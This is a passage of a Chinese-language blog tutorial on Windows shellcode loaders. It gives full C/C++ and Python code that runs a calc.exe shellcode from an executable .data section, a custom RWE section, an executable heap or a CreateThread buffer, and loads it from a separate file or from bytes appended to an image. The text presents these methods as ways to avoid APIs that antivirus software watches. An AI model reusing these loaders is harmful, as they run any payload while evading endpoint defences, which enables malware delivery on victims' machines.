id="修改data段属性"><a href="#修改data段属性" class="headerlink" title="修改data段属性"></a>修改data段属性</h4><blockquote><p>修改内存属性不但可以使用<code>VirtualProtect</code> api函数, 还可以在程序编译的时候修改内存段的属性.</p><p>这样可以规避使用<code>VirtualProtect</code>这个敏感api函数操作了.</p><p>默认全局变量是存放在data段, 修改成可执行即可</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)<span class="comment">//设置 data段可读可写可执行</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((<span class="built_in">void</span>(*)())&amp;buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="新增数据段"><a href="#新增数据段" class="headerlink" title="新增数据段"></a>新增数据段</h4><p>除了修改data段的内存属性, 还可以新增一个段, 设置为可执行的属性</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// 这是一个编译器指令,用于告诉编译器将接下来的数据放置在名为&quot;vdata&quot;的特殊数据段中.这个数据段是一个自定义命名的段,用于存储一些特殊的数据.</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;vdata&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"><span class="comment">//这个指令告诉编译器停止将数据放置在之前定义的特殊数据段中,即&quot;vdata&quot;.</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="comment">//这是一个链接器指令,告诉链接器将&quot;vdata&quot;段标记为可读(Read)、可写(Write)、可执行(Execute).这是为了确保在运行时可以修改这个段的内容,通常用于实现一些动态代码生成或者代码注入的技术</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/SECTION:vdata,RWE&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ((<span class="built_in">void</span>(*)())&amp;buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="通过堆加载"><a href="#通过堆加载" class="headerlink" title="通过堆加载"></a>通过堆加载</h4><blockquote><p>除了通过链接器修改数据段的内存属性外, 还可以通过<code>HeapCreate</code>api获取一个具有执行权限的堆, 并在其中分配一块内存,将其地址赋给<code>shellcode</code>, 也是一种规避<code>VirtualAlloc</code>,<code>VirtualProtect</code>api的一种实现方法, 通过指针运行.</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆,以存储shellcode</span></span><br><span class="line">    HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 在创建的堆中分配一块内存,并将其地址赋给buffer</span></span><br><span class="line">    <span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 将shellcode复制到buffer指向的内存中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 将buffer指向的内存地址强制转换为一个函数指针,并调用该函数,执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())buffer)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建线程执行-CreateThread"><a href="#创建线程执行-CreateThread" class="headerlink" title="创建线程执行-CreateThread"></a>创建线程执行-CreateThread</h3><p><code>CreateThread</code>函数是Windows操作系统提供的一个函数,用于在当前进程中创建一个新的线程.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">HANDLE hHep = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">PVOID Mptr = <span class="built_in">HeapAlloc</span>(hHep, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(Mptr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"><span class="comment">// 分配内存</span></span><br><span class="line">LPVOID Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (Memory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)Memory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="comment">// 关闭线程</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分离加载"><a href="#分离加载" class="headerlink" title="分离加载"></a>分离加载</h2><h3 id="本地分离"><a href="#本地分离" class="headerlink" title="本地分离"></a>本地分离</h3><p>直接在加载器中通过读取文件 ( 二进制文件raw ) 内容的形式获取shellcode, 然后加载运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS <span class="comment">// 解决 fopen_s 的警告</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 读取shellcode文件</span></span><br><span class="line"><span class="type">char</span> filename[] = <span class="string">&quot;conx.ini&quot;</span>;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="keyword">if</span> (fopen_s(&amp;file, filename, <span class="string">&quot;rb&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;Failed to open the code file.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">long</span> size = ftell(file);</span><br><span class="line">fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"><span class="type">char</span>* code = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> (!code) &#123;</span><br><span class="line">perror(<span class="string">&quot;Failed to allocate memory for code.&quot;</span>);</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fread(code, <span class="number">1</span>, size, file) != size) &#123;</span><br><span class="line">perror(<span class="string">&quot;Failed to read code from the file.&quot;</span>);</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="built_in">free</span>(code);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="comment">// 使用VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块</span></span><br><span class="line">LPVOID addr = VirtualAlloc(<span class="literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">// 申请失败 , 退出</span></span><br><span class="line"><span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 把shellcode拷贝到这块内存</span></span><br><span class="line"><span class="built_in">memcpy</span>(addr, code, size);</span><br><span class="line"><span class="comment">// 创建线程运行</span></span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">(LPTHREAD_START_ROUTINE)addr,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line"><span class="comment">// 等待线程运行</span></span><br><span class="line">WaitForSingleObject(hThread, <span class="number">-1</span>);</span><br><span class="line"><span class="comment">// 关闭线程</span></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="built_in">free</span>(code);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图片分离"><a href="#图片分离" class="headerlink" title="图片分离"></a>图片分离</h3><p>制作步骤</p><ol><li><p>选取一张图片, 然后读取图片的字节大小</p></li><li><p>在图片末尾插入shellcode</p></li><li><p>生成一张新的图片, 且记录shellcode的在文件中的起始位置</p></li><li><p>打开图片文件,从shellcode起始位置开始读取</p></li><li><p>正常加载执行</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">shell_code, file_name=<span class="string">&quot;image.jpg&quot;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, mode=<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;shell_code 起始位置为:&quot;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;new.png&quot;</span>, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data + shell_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;shell_code 插入成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = <span class="string">b&quot;\x90\x90\x90\x90\x90\x90\x90\x90\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span></span><br><span class="line">    main(data)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 这里写shell_code 起始位置为: 804306</span></span><br><span class="line"><span class="type">int</span> startNum = <span class="number">804306</span>;</span><br><span class="line">    <span class="comment">// 这里写图片的名称</span></span><br><span class="line"><span class="type">char</span> imageName[] = <span class="string">&quot;new.png&quot;</span>;</span><br><span class="line">FILE* file;</span><br><span class="line">fopen_s(&amp;file, imageName, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!file) &#123;</span><br><span class="line">perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 移动到 shellcode 起始位置</span></span><br><span class="line">fseek(file, startNum, SEEK_SET);</span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">long</span> size = ftell(file);</span><br><span class="line">fseek(file, startNum, SEEK_SET); <span class="comment">// 